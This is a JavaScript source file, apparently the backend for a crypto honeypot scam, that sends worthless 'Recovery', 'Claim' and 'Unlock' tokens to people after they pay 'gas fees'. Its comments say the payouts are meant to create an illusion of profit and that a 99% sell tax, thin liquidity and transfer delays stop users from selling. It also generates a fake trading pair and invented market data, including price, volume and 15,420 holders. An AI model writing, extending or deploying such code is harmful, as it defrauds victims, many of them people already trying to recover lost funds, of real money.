const { ethers } = require('ethers');

class HoneypotTokenService {
  constructor() {
    this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL || 'https://eth-mainnet.g.alchemy.com/v2/demo');
    this.adminWallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, this.provider);
    
    // Deployed honeypot token contracts
    this.tokens = {
      'RECOVERY': {
        address: '0x1234567890123456789012345678901234567890', // Deploy this
        name: 'Recovery Token',
        symbol: 'REC',
        decimals: 18
      },
      'CLAIM': {
        address: '0x2345678901234567890123456789012345678901', // Deploy this
        name: 'Claim Token', 
        symbol: 'CLM',
        decimals: 18
      },
      'UNLOCK': {
        address: '0x3456789012345678901234567890123456789012', // Deploy this
        name: 'Unlock Token',
        symbol: 'ULK', 
        decimals: 18
      }
    };
  }

  // Send real honeypot tokens to user after they pay gas
  async sendHoneypotTokens(userAddress, tokenType, amount, gasFeePaid) {
    try {
      const token = this.tokens[tokenType];
      if (!token) throw new Error('Invalid token type');

      // Create contract instance
      const tokenContract = new ethers.Contract(
        token.address,
        [
          'function transfer(address to, uint256 amount) returns (bool)',
          'function balanceOf(address account) view returns (uint256)',
          'function decimals() view returns (uint8)'
        ],
        this.adminWallet
      );

      // Calculate token amount based on gas paid
      const tokenAmount = this.calculateTokenAmount(gasFeePaid, amount);
      const tokenAmountWei = ethers.parseUnits(tokenAmount.toString(), token.decimals);

      // Send tokens to user
      const tx = await tokenContract.transfer(userAddress, tokenAmountWei);
      await tx.wait();

      // Log the distribution
      console.log(`Sent ${tokenAmount} ${token.symbol} to ${userAddress}`);
      
      return {
        success: true,
        txHash: tx.hash,
        tokenAmount: tokenAmount,
        tokenSymbol: token.symbol,
        tokenAddress: token.address
      };

    } catch (error) {
      console.error('Error sending honeypot tokens:', error);
      return { success: false, error: error.message };
    }
  }

  // Calculate how many tokens to give based on gas fee paid
  calculateTokenAmount(gasFeePaid, requestedAmount) {
    // Free trial - fixed 50 tokens
    if (parseFloat(gasFeePaid) === 0) {
      return parseFloat(requestedAmount) || 50;
    }
    
    // Convert gas fee (ETH) to USD equivalent
    const ethPrice = 3000; // Assume $3000 per ETH
    const gasFeeUSD = parseFloat(gasFeePaid) * ethPrice;
    
    // Tiered system based on payment
    if (gasFeeUSD >= 25) {
      return 3000; // Max pack
    } else if (gasFeeUSD >= 15) {
      return 1500; // Pro pack
    } else if (gasFeeUSD >= 8) {
      return 500;  // Starter pack
    } else {
      // Give tokens worth 10x the gas fee paid (creates illusion of profit)
      const tokenValueUSD = gasFeeUSD * 10;
      return Math.min(tokenValueUSD, parseFloat(requestedAmount) || tokenValueUSD);
    }
  }

  // Create fake trading pairs on DEX (for display only)
  async createFakeTradingPair(tokenAddress) {
    // This would create a Uniswap pair with minimal liquidity
    // Users can see the pair exists but can't sell profitably due to:
    // 1. 99% sell tax in the contract
    // 2. Minimal liquidity (high slippage)
    // 3. Transfer delays
    
    return {
      pairAddress: '0x' + Math.random().toString(16).substr(2, 40),
      liquidityUSD: 1000, // Fake $1000 liquidity
      price: 0.001 // $0.001 per token
    };
  }

  // Get token info for display
  getTokenInfo(tokenType) {
    const token = this.tokens[tokenType];
    if (!token) return null;

    return {
      ...token,
      // Fake market data
      price: 0.001,
      marketCap: 1000000,
      volume24h: 50000,
      holders: 15420,
      // Fake trading pair
      tradingPair: `${token.symbol}/ETH`,
      dexUrl: `https://app.uniswap.org/#/swap?inputCurrency=ETH&outputCurrency=${token.address}`
    };
  }
}

module.exports = new HoneypotTokenService();